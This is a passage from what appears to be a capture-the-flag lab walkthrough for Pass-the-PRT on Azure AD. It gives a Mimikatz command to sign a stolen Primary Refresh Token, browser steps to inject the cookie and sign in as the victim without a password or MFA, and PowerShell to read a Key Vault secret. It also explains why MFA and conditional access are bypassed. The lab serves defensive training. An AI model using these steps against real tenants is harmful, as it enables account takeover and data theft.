# pass_the_prt — Pass-the-PRT: Lateral Movement to the Cloud

python3 -m json.tool
```

### Step 5 — Authenticate as the victim (browser cookie — alternative)

Generate a signed PRT cookie using Mimikatz (uses the **Derived Key**):

```
dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /prt:<PRT>
```

The output ends with `Signature with key:` — copy that full value. **Use it immediately** (the nonce expires in ~1 minute).

On **any machine**, open Microsoft Edge or Chrome in **private/incognito** mode:

1. Navigate to `https://login.microsoftonline.com`
2. Open Developer Tools (`F12`) → **Application** → **Cookies** → `https://login.microsoftonline.com` → delete all cookies
3. Add a new cookie:

| Field    | Value                             |
|----------|-----------------------------------|
| Name     | `x-ms-RefreshTokenCredential`     |
| Value    | `<paste the signed cookie value>` |
| Domain   | `login.microsoftonline.com`       |
| Path     | `/`                               |
| HttpOnly | ✓                                 |
| Secure   | ✓                                 |

4. In the address bar type `https://login.microsoftonline.com` and press Enter (do not just press F5)
5. Enter the victim's UPN (`ptp-victim-XXXX@yourdomain.onmicrosoft.com`) — Azure AD reads the cookie during the credential phase and signs you in with **no password or MFA prompt**

### Step 6 — Read the flag from Key Vault

Via the Azure portal (authenticated as victim in browser):

1. Navigate to **Key Vaults** → `<keyvault_name>`
2. **Secrets** → `flag` → click the version → **Show Secret Value**

Or with PowerShell using an ARM token from roadtx:

```powershell
$token = (python3 -c "import json; print(json.load(open('.roadtools_auth'))['accessToken'])")
Connect-AzAccount -AccessToken $token -AccountId <victim_upn>
Get-AzKeyVaultSecret -VaultName <keyvault_name> -Name flag -AsPlainText
```

### Step 7 — Submit the flag

```shell
cnimbus azure validate --app-id pass_the_prt --flag "CUMULONIMBUS{...}"
```

## Why MFA does not help

The PRT encodes the device claim (`DeviceId`, `TrustType: AzureAD`). Azure AD's token issuance engine treats a valid PRT cookie as proof that the user already satisfied MFA on a compliant device. Conditional access policies requiring MFA **or** compliant device are therefore silently bypassed.

### Lab vs real world — MFA claims

In this lab the victim authenticates via automated autologon (password only), so the PRT carries `amr: ["pwd"]` with no MFA claim. This is why **Security Defaults blocks ARM access** — it checks for the `mfa` amr specifically, and the device claim does not satisfy it.

In a real corporate environment users authenticate interactively with MFA every day. Their PRT carries `amr: ["pwd", "mfa"]`. An attacker who steals that PRT inherits the MFA claim and can access **any** resource — including those protected by strict MFA-only policies — with no MFA prompt. This is the true power of the technique.

The lab demonstrates the device-claim bypass (CA policies requiring compliant device). To avoid the Security Defaults limitation, disable Security Defaults and use a Conditional Access policy with "MFA or compliant device" — the Azure AD-joined device satisfies the compliant device branch without needing an MFA claim in the PRT.

## Teardown

```shell
cnimbus azure destroy --app-id pass_the_prt
```

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic |
|---|---|---|
| [T1550.001](https://attack.mitre.org/techniques/T1550/001/) | Use Alternate Authentication Material: Application Access Token | Defense Evasion |
| [T1078.004](https://attack.mitre.org/techniques/T1078/004/) | Valid Accounts: Cloud Accounts | Defense Evasion |
| [T1528](https://attack.mitre.org/techniques/T1528/) | Steal Application Access Token | Credential Access |
